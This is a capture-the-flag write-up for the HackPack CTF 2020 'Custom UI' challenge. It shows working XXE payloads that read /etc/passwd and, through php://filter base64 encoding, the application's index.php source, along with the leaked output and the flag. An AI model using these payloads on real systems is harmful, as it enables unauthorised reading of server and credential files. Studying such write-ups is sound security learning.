---
title: 'HackPack CTF 2020: Custom UI'
date: 2020-05-18
categories: [writeups]
author: None
---

> How often do you visit the website just to bounce back because of bad design?
> Now we developed a new feature, which gives you the ability to change the
> design! Check out a new feature: https://custom-ui.cha.hackpack.club/

<!--more-->

By fiddling with the input we get some interesting warnings

```
Warning:  DOMDocument::loadXML(): StartTag: invalid element name in Entity, line: 1 in /var/www/html/index.php on line 12
Warning:  simplexml_import_dom(): Invalid Nodetype to import in /var/www/html/index.php on line 13
```

and inspecting the traffic we see that the data is indeed XML encoded:

```
xdata: <button><color>red</color><value>foo</value></button>
```

Let's try a simple XEE attack:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT button ANY>
  <!ELEMENT color ANY>
  <!ENTITY xee SYSTEM "file:///etc/passwd">
]>
<button>
  <color></color>
  <value>&xee;</value>
</button>
```

Lo and behold, out pops `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

What file should we look at next? From the warnings we know the location of
`index.php`. Unfortunately, since PHP isn't XML but looks a bit like it, if we
try to include a raw PHP file in the XML we just get a bunch of warnings of
the following sort:

```
Warning:  DOMDocument::loadXML(): StartTag: invalid element name in file:///var/www/html/index.php, line: 20 in /var/www/html/index.php on line 12
Warning:  DOMDocument::loadXML(): Opening and ending tag mismatch: meta line 24 and head in file:///var/www/html/index.php, line: 27 in /var/www/html/index.php on line 12
Warning:  DOMDocument::loadXML(): xmlParsePI : no target name in file:///var/www/html/index.php, line: 31 in /var/www/html/index.php on line 12
Warning:  DOMDocument::loadXML(): xmlParsePI : no target name in file:///var/www/html/index.php, line: 35 in /var/www/html/index.php on line 12
Warning:  DOMDocument::loadXML(): Unescaped '&lt;' not allowed in attributes values in file:///var/www/html/index.php, line: 36 in /var/www/html/index.php on line 12
```

There is a standard trick to enclose the offending file in a CDATA section, but
it is somewhat roundabout, and since it is PHP we are dealing with we can
instead take advantage of its idiosyncratic data filtering feature like so:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT button ANY>
  <!ELEMENT color ANY>
  <!ENTITY xee SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">
]>
<button>
  <color></color>
  <value>&xee;</value>
</button>
```

Towards the end of the file is the following snippet

```php
<?php
  if ($debug == "true") {
    echo "<!-- TODO: Delete flag.txt from /etc/ -->";
  }
?>
```

which directs us to the flag:

```
flag{d1d_y0u_kn0w_th@t_xml_can_run_code?}
```

By the way: I did not and still don't know that XML can run code.
